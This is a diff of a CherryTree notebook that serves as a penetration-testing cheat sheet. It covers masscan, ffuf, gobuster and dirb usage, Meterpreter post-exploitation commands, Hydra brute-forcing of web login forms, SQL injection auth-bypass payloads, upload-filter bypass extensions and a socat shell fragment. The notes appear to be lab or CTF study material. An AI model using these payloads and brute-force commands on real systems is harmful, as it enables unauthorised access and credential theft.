+      <rich_text indent="1">-oX </rich_text>
+      <rich_text indent="1" weight="heavy">NEW_XML_FILE</rich_text>
+      <rich_text>
+
+</rich_text>
+      <node name="Manual" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1695242334" ts_lastsave="1700046364">
+        <rich_text>MASSCAN is a fast port scanner. The primary input parameters are the IP addresses/ranges you want to scan, and the port numbers.
 
 An example is the following, which scans the 10.x.x.x network for web servers:
 </rich_text>
-      <rich_text indent="1"> masscan 10.0.0.0/8 -p80</rich_text>
-      <rich_text>
+        <rich_text indent="1"> masscan 10.0.0.0/8 -p80</rich_text>
+        <rich_text>
  
 The program auto-detects network interface/adapter settings. If this fails, you'll have to set these manually. 
 The following is an example of all the parameters that are needed:
 </rich_text>
-      <rich_text indent="1"> --adapter-ip 192.168.10.123
+        <rich_text indent="1"> --adapter-ip 192.168.10.123
  --adapter-mac 00-11-22-33-44-55
  --router-mac 66-55-44-33-22-11</rich_text>
-      <rich_text>
+        <rich_text>
  
 Parameters can be set either via the command-line or config-file. The names are the same for both. Thus, the above adapter settings would appear as follows in a configuration file:
 </rich_text>
-      <rich_text indent="1"> adapter-ip = 192.168.10.123
+        <rich_text indent="1"> adapter-ip = 192.168.10.123
  adapter-mac = 00-11-22-33-44-55
  router-mac = 66-55-44-33-22-11</rich_text>
-      <rich_text>
+        <rich_text>
  
 All single-dash parameters have a spelled out double-dash equivalent, so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
 
@@ -1407,48 +1457,8 @@ To use the config file, type:  masscan -c &lt;filename&gt;
 To generate a config-file from the current settings, use the --echo option.
 This stops the program from actually running, and just echoes the current configuration instead. This is a useful way to generate your first config file, or see a list of parameters you didn't know about. 
 </rich_text>
-      <rich_text indent="1">I suggest you try it now:  masscan -p1234 --echo</rich_text>
-      <node name="Commands" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695242334" ts_lastsave="1695242899">
-        <rich_text>scan some ports at specified kpps
-</rich_text>
-        <rich_text indent="1">masscan -p</rich_text>
-        <rich_text indent="1" weight="heavy">PORTS</rich_text>
-        <rich_text indent="1">  </rich_text>
-        <rich_text indent="1" weight="heavy">TARGET</rich_text>
-        <rich_text indent="1"> --rate=</rich_text>
-        <rich_text indent="1" weight="heavy">RATE</rich_text>
-        <rich_text indent="1">
-
-</rich_text>
-        <rich_text> list  options that are compatible with nmap</rich_text>
-        <rich_text indent="1">
-masscan --nmap
-
-</rich_text>
-        <rich_text> save results of scan in binary format</rich_text>
-        <rich_text indent="1">
-masscan -p</rich_text>
-        <rich_text indent="1" weight="heavy">PORTS</rich_text>
-        <rich_text indent="1">  </rich_text>
-        <rich_text indent="1" weight="heavy">TARGET</rich_text>
-        <rich_text indent="1"> --banners -oB </rich_text>
-        <rich_text indent="1" weight="heavy">FILE</rich_text>
-        <rich_text indent="1">
-
-</rich_text>
-        <rich_text> read binary scan results in a file and save them as xml
-</rich_text>
-        <rich_text indent="1"> masscan --open --banners --readscan </rich_text>
-        <rich_text indent="1" weight="heavy">BIN_FILE </rich_text>
-        <rich_text indent="1">-oX </rich_text>
-        <rich_text indent="1" weight="heavy">NEW_XML_FILE</rich_text>
+        <rich_text indent="1">I suggest you try it now:  masscan -p1234 --echo</rich_text>
         <rich_text>
-
-
-
-
-
-
 
 </rich_text>
       </node>
@@ -1458,13 +1468,33 @@ masscan -p</rich_text>
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 </rich_text>
-    <node name="FFUF" unique_id="11" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695159786" ts_lastsave="1697102270">
+    <node name="FFUF" unique_id="11" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695159786" ts_lastsave="1700045995">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Fuzz Faster U Fool - v2.0.0-dev
+Standard directory enumeration:
+</rich_text>
+      <rich_text indent="1">ffuf -w </rich_text>
+      <rich_text indent="1" weight="heavy">/WORDLIST</rich_text>
+      <rich_text indent="1"> -u </rich_text>
+      <rich_text>http://</rich_text>
+      <rich_text weight="heavy">IP</rich_text>
+      <rich_text>/FUZZ
+
+Subdomain enumeration with partial domain:
+</rich_text>
+      <rich_text indent="1">ffuf -w </rich_text>
+      <rich_text indent="1" weight="heavy">/WORDLIST</rich_text>
+      <rich_text indent="1"> -H "Host: FUZZ.</rich_text>
+      <rich_text indent="1" weight="heavy">DOMAIN</rich_text>
+      <rich_text indent="1">" -u </rich_text>
+      <rich_text>http://IP
+
+</rich_text>
+      <node name="Manual" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="#ffffff" ts_creation="1695159950" ts_lastsave="1700046119">
+        <rich_text>Fuzz Faster U Fool - v2.0.0-dev
 
 HTTP OPTIONS:
 </rich_text>
-      <rich_text indent="1">  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
+        <rich_text indent="1">  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
   -X                  HTTP method to use
   -b                  Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.
   -d                  POST data
@@ -1479,11 +1509,11 @@ HTTP OPTIONS:
   -timeout            HTTP request timeout in seconds. (default: 10)
   -u                  Target URL
   -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080</rich_text>
-      <rich_text>
+        <rich_text>
 
 GENERAL OPTIONS:
 </rich_text>
-      <rich_text indent="1">  -V                  Show version information. (default: false)
+        <rich_text indent="1">  -V                  Show version information. (default: false)
   -ac                 Automatically calibrate filtering options (default: false)
   -acc                Custom auto-calibration string. Can be used multiple times. Implies -ac
   -ach                Per host autocalibration (default: false)
@@ -1506,33 +1536,33 @@ GENERAL OPTIONS:
   -sf                 Stop when &gt; 95% of responses return 403 Forbidden (default: false)
   -t                  Number of concurrent threads. (default: 40)
   -v                  Verbose output, printing full URL and redirect location (if any) with the results. (default: false)</rich_text>
-      <rich_text>
+        <rich_text>
 
 MATCHER OPTIONS:
 </rich_text>
-      <rich_text indent="1">  -mc                 Match HTTP status codes, or "all" for everything. (default: 200,204,301,302,307,401,403,405,500)
+        <rich_text indent="1">  -mc                 Match HTTP status codes, or "all" for everything. (default: 200,204,301,302,307,401,403,405,500)
   -ml                 Match amount of lines in response
   -mmode              Matcher set operator. Either of: and, or (default: or)
   -mr                 Match regexp
   -ms                 Match HTTP response size
   -mt                 Match how many milliseconds to the first response byte, either greater or less than. EG: &gt;100 or &lt;100
   -mw                 Match amount of words in response</rich_text>
-      <rich_text>
+        <rich_text>
 
 FILTER OPTIONS:
 </rich_text>
-      <rich_text indent="1">  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
+        <rich_text indent="1">  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
   -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
   -fmode              Filter set operator. Either of: and, or (default: or)
   -fr                 Filter regexp
   -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
   -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: &gt;100 or &lt;100
   -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges</rich_text>
-      <rich_text>
+        <rich_text>
 
 INPUT OPTIONS:
 </rich_text>
-      <rich_text indent="1">  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
+        <rich_text indent="1">  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
   -e                  Comma separated list of extensions. Extends FUZZ keyword.
   -ic                 Ignore wordlist comments (default: false)
   -input-cmd          Command producing the input. --input-num is required when using this input method. Overrides -w.
@@ -1542,61 +1572,88 @@ INPUT OPTIONS:
   -request            File containing the raw http request
   -request-proto      Protocol to use along with raw request (default: https)
   -w                  Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'</rich_text>
-      <rich_text>
+        <rich_text>
 
 OUTPUT OPTIONS:
 </rich_text>
-      <rich_text indent="1">  -debug-log          Write all of the internal logging to the specified file.
+        <rich_text indent="1">  -debug-log          Write all of the internal logging to the specified file.
   -o                  Write output to file
   -od                 Directory path to store matched results to.
   -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
   -or                 Don't create the output file if we don't have results (default: false)</rich_text>
-      <rich_text>
+        <rich_text>
 
 EXAMPLE USAGE:
 </rich_text>
-      <rich_text indent="1">  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
+        <rich_text indent="1">  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
   Colored, verbose output.
     ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v</rich_text>
-      <rich_text>
+        <rich_text>
 
   Fuzz Host-header, match HTTP 200 responses.
 </rich_text>
-      <rich_text indent="1">    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200</rich_text>
-      <rich_text>
+        <rich_text indent="1">    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200</rich_text>
+        <rich_text>
 
   Fuzz POST JSON data. Match all responses not containing text "error".
 </rich_text>
-      <rich_text indent="1">    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
+        <rich_text indent="1">    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
       -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"</rich_text>
-      <rich_text>
+        <rich_text>
 
   Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
 </rich_text>
-      <rich_text indent="1">    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c</rich_text>
-      <rich_text>
+        <rich_text indent="1">    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c</rich_text>
+        <rich_text>
 
   More information and examples: https://github.com/ffuf/ffuf</rich_text>
-      <node name="Commands" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695159950" ts_lastsave="1695235806">
-        <rich_text>Standard directory enumeration:
-</rich_text>
-        <rich_text indent="1">ffuf -w </rich_text>
-        <rich_text indent="1" weight="heavy">/WORDLIST</rich_text>
-        <rich_text indent="1"> -u http://</rich_text>
-        <rich_text indent="1" weight="heavy">IP</rich_text>
-        <rich_text indent="1">/FUZZ</rich_text>
       </node>
     </node>
-    <node name="Gobuster" unique_id="14" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160129" ts_lastsave="1697102272">
+    <node name="Gobuster" unique_id="14" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160129" ts_lastsave="1700055891">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Usage:
+Standard directory enumeration:
 </rich_text>
-      <rich_text indent="1">  gobuster [command]</rich_text>
+      <rich_text indent="1">gobuster dir -u http://</rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">/ -w </rich_text>
+      <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
       <rich_text>
+</rich_text>
+      <rich_text indent="1">-e print full url</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">-k skip TLS certificate check</rich_text>
+      <rich_text>
+
+Enumerate files with specific extensions in a directory:
+</rich_text>
+      <rich_text indent="1">gobuster dir -u </rich_text>
+      <rich_text>http://</rich_text>
+      <rich_text weight="heavy">IP</rich_text>
+      <rich_text>/ -w </rich_text>
+      <rich_text weight="heavy">WORDLIST</rich_text>
+      <rich_text> -x </rich_text>
+      <rich_text weight="heavy">EXTENSION</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="8">jpg,php,...</rich_text>
+      <rich_text>
+
+Standard subdomain enumeratrion
+</rich_text>
+      <rich_text indent="1">gobuster</rich_text>
+      <rich_text> vhost -w </rich_text>
+      <rich_text weight="heavy">WORDLIST</rich_text>
+      <rich_text> -u http://DOMAIN/ --append-domain </rich_text>
+      <node name="Manual" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="#ffffff" ts_creation="1695160129" ts_lastsave="1700046136">
+        <rich_text>Usage:
+</rich_text>
+        <rich_text indent="1">  gobuster [command]</rich_text>
+        <rich_text>
 
 Available Commands:
 </rich_text>
-      <rich_text indent="1">  completion  Generate the autocompletion script for the specified shell
+        <rich_text indent="1">  completion  Generate the autocompletion script for the specified shell
   dir         Uses directory/file enumeration mode
   dns         Uses DNS subdomain enumeration mode
   fuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
@@ -1606,11 +1663,11 @@ Available Commands:
   tftp        Uses TFTP enumeration mode
   version     shows the current version
   vhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)</rich_text>
-      <rich_text>
+        <rich_text>
 
 Flags:
 </rich_text>
-      <rich_text indent="1">      --debug                 Enable debug output
+        <rich_text indent="1">      --debug                 Enable debug output
       --delay duration        Time each thread waits between requests (e.g. 1500ms)
   -h, --help                  help for gobuster
       --no-color              Disable color output
@@ -1623,63 +1680,44 @@ Flags:
   -v, --verbose               Verbose output (errors)
   -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.
       --wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)</rich_text>
-      <rich_text>
+        <rich_text>
 
 Use "gobuster [command] --help" for more information about a command.</rich_text>
-      <node name="Commands" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695160129" ts_lastsave="1699275963">
-        <rich_text>Standard directory enumeration:
-</rich_text>
-        <rich_text indent="1">gobuster dir --url http://</rich_text>
-        <rich_text indent="1" weight="heavy">IP</rich_text>
-        <rich_text indent="1">/ -w </rich_text>
-        <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
-        <rich_text>
-
-Enumerate files with specific extensions in a directory:
-</rich_text>
-        <rich_text indent="1">gobuster dir --url </rich_text>
-        <rich_text>http://</rich_text>
-        <rich_text weight="heavy">IP</rich_text>
-        <rich_text>/ -w </rich_text>
-        <rich_text weight="heavy">WORDLIST</rich_text>
-        <rich_text> -x </rich_text>
-        <rich_text weight="heavy">EXTENSION</rich_text>
-        <rich_text>
-</rich_text>
-        <rich_text indent="8">jpg,php,...</rich_text>
-        <rich_text>
-
-Standard subdomain enumeratrion
-</rich_text>
-        <rich_text indent="1">gobuster</rich_text>
-        <rich_text> vhost -w </rich_text>
-        <rich_text weight="heavy">WORDLIST</rich_text>
-        <rich_text> -u http://DOMAIN/ --append-domain </rich_text>
       </node>
     </node>
-    <node name="Dirbuster" unique_id="17" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160372" ts_lastsave="1699285224">
+    <node name="Dirbuster" unique_id="17" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160372" ts_lastsave="1700046147">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-DIRB(1)                                                          General Commands Manual                                                          DIRB(1)
+Standard directory enumeration:
+</rich_text>
+      <rich_text indent="1">dirb http://</rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">/ </rich_text>
+      <rich_text weight="heavy">/WORDLIST</rich_text>
+      <rich_text>
+
+</rich_text>
+      <node name="Manual" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="#ffffff" ts_creation="1695160372" ts_lastsave="1700046178">
+        <rich_text>DIRB(1)                                                          General Commands Manual                                                          DIRB(1)
 
 NAME
 </rich_text>
-      <rich_text indent="1">       dirb - Web Content Scanner</rich_text>
-      <rich_text>
+        <rich_text indent="1">       dirb - Web Content Scanner</rich_text>
+        <rich_text>
 
 SYNOPSIS
 </rich_text>
-      <rich_text indent="1">       dirb &lt;url_base&gt; &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]</rich_text>
-      <rich_text>
+        <rich_text indent="1">       dirb &lt;url_base&gt; &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]</rich_text>
+        <rich_text>
 
 DESCRIPTION
 </rich_text>
-      <rich_text indent="1">       DIRB  IS  a  Web  Content  Scanner.  It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack
+        <rich_text indent="1">       DIRB  IS  a  Web  Content  Scanner.  It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack
        against a web server and analizing the response.</rich_text>
-      <rich_text>
+        <rich_text>
 
 OPTIONS
 </rich_text>
-      <rich_text indent="1">       ‐a &lt;agent_string&gt;
+        <rich_text indent="1">       ‐a &lt;agent_string&gt;
               Specify your custom USER_AGENT.  (Default is: "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")
        ‐b     Don’t squash or merge sequences of /../ or /./ in the given URL.
        ‐c &lt;cookie_string&gt;
@@ -1714,18 +1752,11 @@ OPTIONS
        ‐z &lt;milisecs&gt;
               Amplify search with this extensions.
 </rich_text>
-      <rich_text>
+        <rich_text>
 
 
 The Dark Raver                                                          27/01/2009                                                                DIRB(1)
 </rich_text>
-      <node name="Commands" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695160372" ts_lastsave="1695235792">
-        <rich_text>Standard directory enumeration:
-</rich_text>
-        <rich_text indent="1">dirb http://</rich_text>
-        <rich_text indent="1" weight="heavy">IP</rich_text>
-        <rich_text indent="1">/ </rich_text>
-        <rich_text weight="heavy">/WORDLIST</rich_text>
       </node>
     </node>
     <node name="Nikto" unique_id="83" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699285224" ts_lastsave="1699285256">
@@ -2218,8 +2249,14 @@ delete: -d</rich_text>
 </rich_text>
       <rich_text indent="1">help / -h</rich_text>
     </node>
-    <node name="Meterpreter" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1699453956" ts_lastsave="1699459961">
+    <node name="Meterpreter" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1699453956" ts_lastsave="1699973896">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Upload a file:
+</rich_text>
+      <rich_text indent="1">upload </rich_text>
+      <rich_text indent="1" weight="heavy">PATH/FILE</rich_text>
+      <rich_text>
+
 Migrate PID:
 </rich_text>
       <rich_text indent="1">migrate </rich_text>
@@ -2236,6 +2273,9 @@ Search for a file:
       <rich_text indent="1">search -f </rich_text>
       <rich_text indent="1" weight="heavy">FILENAME</rich_text>
       <rich_text>
+</rich_text>
+      <rich_text indent="1">search -f *flag* -d c:\\Users\\bill</rich_text>
+      <rich_text>
 
 Get regular shell:
 </rich_text>
@@ -2249,6 +2289,12 @@ Load extra tools:
 </rich_text>
       <rich_text indent="1">load </rich_text>
       <rich_text indent="1" weight="heavy">NAME</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">load powershell</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">powershell_shell</rich_text>
       <rich_text>
 
 LINUX:</rich_text>
@@ -2344,9 +2390,23 @@ hashdump: Dumps the contents of the SAM database</rich_text>
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1699449901">
+    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1700059155">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Hydra:
+</rich_text>
+      <rich_text indent="1">-l </rich_text>
+      <rich_text indent="1" weight="heavy">LOGIN</rich_text>
+      <rich_text indent="1">
+-l </rich_text>
+      <rich_text indent="1" weight="heavy">LOGIN_WORDLIST</rich_text>
+      <rich_text indent="1">
+-p </rich_text>
+      <rich_text indent="1" weight="heavy">PASSWORD</rich_text>
+      <rich_text indent="1">
+-P </rich_text>
+      <rich_text indent="1" weight="heavy">PASSWORD_WORDLIST</rich_text>
+      <rich_text>
+
 </rich_text>
       <rich_text indent="1">hydra -t </rich_text>
       <rich_text indent="1" weight="heavy">#CONNECTIONS</rich_text>
@@ -2369,6 +2429,39 @@ hydra -t </rich_text>
       <rich_text indent="1" weight="heavy">PROTOCOL</rich_text>
       <rich_text indent="1">://</rich_text>
       <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text indent="1">login form on website:
+adjust http-post-form!
+</rich_text>
+      <rich_text indent="2">Username:</rich_text>
+      <rich_text indent="1">
+</rich_text>
+      <rich_text indent="3">hydra -L/ </rich_text>
+      <rich_text indent="3" weight="heavy">LOGIN_WORDLIST</rich_text>
+      <rich_text indent="3"> -p test </rich_text>
+      <rich_text indent="3" weight="heavy">IP</rich_text>
+      <rich_text indent="3"> http-post-form "/:username=^USER^&amp;password=^PASS^:</rich_text>
+      <rich_text indent="3" weight="heavy">ERROR_TEXT</rich_text>
+      <rich_text indent="3">."</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">Password (try sql injection first):</rich_text>
+      <rich_text indent="1">
+</rich_text>
+      <rich_text indent="3">hydra -l </rich_text>
+      <rich_text indent="3" weight="heavy">LOGIN</rich_text>
+      <rich_text indent="3"> -p </rich_text>
+      <rich_text indent="3" weight="heavy">PASSWORD_WORDLIST</rich_text>
+      <rich_text indent="3"> </rich_text>
+      <rich_text indent="3" weight="heavy">IP</rich_text>
+      <rich_text indent="3"> http-post-form "/:username=^USER^&amp;password=^PASS^:</rich_text>
+      <rich_text indent="3" weight="heavy">ERROR_TEXT</rich_text>
+      <rich_text indent="3">."</rich_text>
+      <rich_text>
+
+</rich_text>
     </node>
     <node name="Cracking" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699881793">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -2923,13 +3016,19 @@ Encrypted shells:
       <rich_text>EXEC:"bash -li"
 </rich_text>
     </node>
-    <node name="SQL Injection" unique_id="93" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699525351" ts_lastsave="1699525351">
+    <node name="SQL Injection" unique_id="93" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699525351" ts_lastsave="1700054696">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Auth bypass:
+</rich_text>
+      <rich_text weight="heavy">USERNAME</rich_text>
+      <rich_text>'; -- -
 
 skip any sql statements:
+  ' AND '1'='1 --</rich_text>
+      <rich_text indent="1">
 </rich_text>
-      <rich_text indent="1"> ' or 1=1--</rich_text>
-      <rich_text>
+      <rich_text>   ' AND '1'='2 --
+   ' or 1=1--
  
  partially skip sql statements:
 </rich_text>
@@ -3205,7 +3304,7 @@ changing query parameter values</rich_text>
       </node>
     </node>
   </node>
-  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699892768">
+  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699979997">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 Useful links:
@@ -3220,6 +3319,9 @@ Useful links:
     <rich_text indent="1"> 
 </rich_text>
     <rich_text indent="1" link="webs https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</rich_text>
+    <rich_text> 
+</rich_text>
+    <rich_text indent="1" link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
     <rich_text> 
 
 
@@ -3645,7 +3747,7 @@ UPLOAD EXPLOITATION:
     <rich_text>filtering based on MIME types.
 </rich_text>
     <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
-    <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699869498">
+    <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699967980">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 basic ways to bypass client-side file upload filter:
 
@@ -3675,7 +3777,7 @@ Basic server-side filter bypass
       <rich_text indent="1">if filtering "PHP" on just “.”</rich_text>
       <rich_text>
 </rich_text>
-      <rich_text indent="2">instead of .PHP use .php3, .php4, .php5, .php7, .phps, .php-s, .pht or .phar</rich_text>
+      <rich_text indent="2">instead of .PHP use .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phtml or .phar</rich_text>
       <rich_text>
 </rich_text>
       <rich_text indent="1">Magic numbers</rich_text>
@@ -3789,7 +3891,7 @@ GPG:
 </rich_text>
     <rich_text indent="1">New file will be created with the plaintext</rich_text>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699892190">
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1700064160">
     <rich_text>
 =================
 </rich_text>
